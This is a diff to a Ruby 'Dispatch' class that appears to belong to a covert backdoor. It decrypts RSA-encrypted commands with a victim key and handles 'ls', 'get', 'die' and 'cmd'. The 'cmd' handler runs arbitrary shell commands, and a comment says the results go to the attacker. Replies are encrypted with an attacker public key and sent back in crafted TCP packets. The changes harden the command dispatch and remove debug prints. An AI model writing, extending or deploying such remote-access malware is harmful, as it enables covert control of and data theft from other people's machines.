@@ -20,24 +20,28 @@ class Dispatch
 
 	def initialize(ciphertext, interface, ethaddr)
 		plaintext = decrypt ciphertext
-        @interface = interface
-        @ethaddr = ethaddr
+		if plaintext
+			@interface = interface
+			@ethaddr = ethaddr
 
-		# Split up the request so we can pass the parameters to the correct method
-		request = plaintext.split
+			# Split up the request so we can pass the parameters to the correct method
+			request = plaintext.split
 
-		case request[0].downcase
-		when "ls"
-			ls request[1]
-		when "get"
-			get request[1], request[2], request[3]
-		when "die"
-			die
-		when "cmd"
-			# Remove `cmd ` from the string, and pass the rest as the command
-			cmd plaintext[4..plaintext.length]
+			case request[0].downcase
+			when "ls"
+				@response = ls request[1]
+			when "get"
+				get request[1], request[2], request[3]
+			when "die"
+				die
+			when "cmd"
+				# Remove `cmd ` from the string, and pass the rest as the command
+				@response = cmd plaintext[4..plaintext.length]
+			else
+				@response = "Unknown command."
+			end
 		else
-			"Unknown command."
+			@response = "Unable to decrypt packet."
 		end
 	end
 
@@ -67,7 +71,7 @@ class Dispatch
 
 			File.open(path, "rb") do |file|
 				while(line = file.gets)
-				    tcp = TCPPacket.new(:config => cfg)
+					tcp = TCPPacket.new(:config => cfg)
 					tcp.eth_saddr = cfg[:eth_saddr]
 					tcp.eth_daddr = @ethaddr
 					
@@ -120,11 +124,10 @@ class Dispatch
 	# Run any command and send the result to the attacker.
 
 	def cmd(command)
-		print command
 		begin
-			@response = `#{command}`
+			`#{command}`
 		rescue Exception => e
-			@response = e.to_s
+			e.to_s
 		end
 	end
 
@@ -155,7 +158,6 @@ class Dispatch
 			data = data[0..234] + "\n"
 		end
 
-		print data.length
 		key = OpenSSL::PKey::RSA.new File.read '../keys/attacker.pub'
 		return key.public_key.public_encrypt(data)
 	end
@@ -166,8 +168,12 @@ class Dispatch
 	# return the result. 
 
 	def decrypt(data)
-		key = OpenSSL::PKey::RSA.new File.read '../keys/victim.pem'
-		return key.private_decrypt(data)
+		begin
+			key = OpenSSL::PKey::RSA.new File.read '../keys/victim.pem'
+			return key.private_decrypt(data)
+		rescue
+			return false
+		end
 	end
 
 # -------------------------------------------------------------
